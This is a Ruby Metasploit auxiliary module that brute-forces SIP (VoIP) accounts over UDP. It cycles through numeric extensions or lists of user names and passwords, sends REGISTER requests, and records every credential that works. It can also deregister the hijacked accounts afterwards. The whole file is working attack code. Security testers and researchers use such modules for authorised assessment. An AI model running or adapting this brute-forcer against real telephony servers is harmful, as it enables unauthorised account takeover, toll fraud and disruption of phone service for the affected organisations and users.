##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'digest/md5'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
        include Msf::Auxiliary::SIP

	def initialize
		super(
			'Name'        => 'SIP User and Password Brute Forcer (UDP)',
			'Version'     => '1',
			'Description' => 'Brute Force Module for SIP Services',
			'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
			'License'     => MSF_LICENSE
		)

		deregister_options('RHOSTS')

		register_options(
		[
			OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
			OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
			OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
		    	OptString.new('METHOD',   [ true, "The method for Brute Forcing (REGISTER)", "REGISTER"]),
			OptString.new('USERNAME',   [ false, "The login username to probe", "NOUSER"]),
			OptString.new('PASSWORD',   [ false, "The login password to probe", "NOPASSWORD"]),
			OptString.new('REALM',   [ true, "The login realm to probe", "realm.com.tr"]),
			OptString.new('TO',   [ false, "The destination username to probe", "1000"]),
			OptString.new('FROM',   [ false, "The source username to probe", "1000"]),
			OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false]),
			OptBool.new('USER_AS_FROM_and_TO', [true, 'Try the username as the from/to for all users', true]),
			OptBool.new('DEREGISTER', [true, 'DeRegister After Successful Login', false]),
			Opt::RHOST,
			Opt::RPORT(5060),
			Opt::CHOST,	
			Opt::CPORT(5065)
		], self.class)

		register_advanced_options(
		[
			OptBool.new('DEBUG',   [ false, "Verbose Level", false]),
			OptBool.new('VERBOSE',   [ false, "Verbose Level", false])
		], self.class)
	end

	def run
		udp_sock = nil

		realm = datastore['REALM']
		method = datastore['METHOD']
		from = datastore['FROM']
		to = datastore['TO']		
		listen_addr = datastore['CHOST']
		listen_port = datastore['CPORT'].to_i 
		dest_addr =datastore['RHOST']  
		dest_port = datastore['RPORT'].to_i 
		
		start_sipsrv(listen_port,listen_addr,dest_port,dest_addr)

		if datastore['NUMERIC_USERS'] == true
			passwords=load_password_vars
			exts=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
			exts.each { |ext|
				ext=ext.to_s
				from=to=ext if datastore['USER_AS_FROM_and_TO']
				passwords.each {|password|
			    		do_login(ext,password,realm,from,to,dest_addr,method)
				}
			}       
		else
			each_user_pass { |user, password|
		        	from=to=user if datastore['USER_AS_FROM_and_TO']
		        	do_login(user,password,realm,from,to,dest_addr,method)
			}
		end
	end
	def do_login(user,password,realm,from,to,dest_addr,method)
		vprint_status("Trying username:'#{user}' with password:'#{password}'")

		result,rdata,rdebug,rawdata = send_register(
			'login'  	=> true,	
			'user'     	=> user,
			'password'	=> password,
			'realm' 	=> realm,
			'from'    	=> from,
			'to'    	=> to
		)  

		if  result =~ /succeed/ 
			print_good("user : #{user} \tpassword : #{password} \tresult : #{convert_error(result)}")

			#Saving User to DB
			report_auth_info(
				:host	=> dest_addr,
				:port	=> datastore['RPORT'],
				:sname	=> 'sip',
				:user	=> user,
				:pass	=> password,
				:proof  => nil,
				:source_type => "user_supplied",
				:active => true
			)

			if datastore['DEREGISTER'] == true
				#De-Registering User
				send_register(
				'login'  	=> datastore['LOGIN'],
				'user'     	=> user,
				'password'	=> password,
				'realm'     	=> realm,
				'from'    	=> from,
				'to'    	    => to,
				'expire'    	=> 0
				) 
			end 
		else
			if rdata !=nil
				vprint_status("#{rdata["source"]}\t #{convert_error(result)} : #{rdata['resp_msg']}") 
			else 
				vprint_status("#{dest_addr}")
			end
		end


		#Debug
		if datastore['DEBUG']
			if rdata !=nil
				print_debug("#{rdata['source']}\tresponse: #{rdata['resp_msg'].split(" ")[1,5].join(" ")}")
				print_debug("Server \t: #{rdata['server']}") if rdata['server']
				print_debug("User-Agent \t: #{rdata['agent']}")	if rdata['agent']
				print_debug("Realm \t: #{rdata['digest']['realm']}") if rdata['digest']
			end

			rawdata.split("\n").each { |r| print_debug("Response Details: #{r}") } if rdata != nil
			rdebug.each { |r| print_debug("Irrelevant Responses :  #{r['resp']} #{r['resp_msg']}") } if rdebug
		end	
    end
end

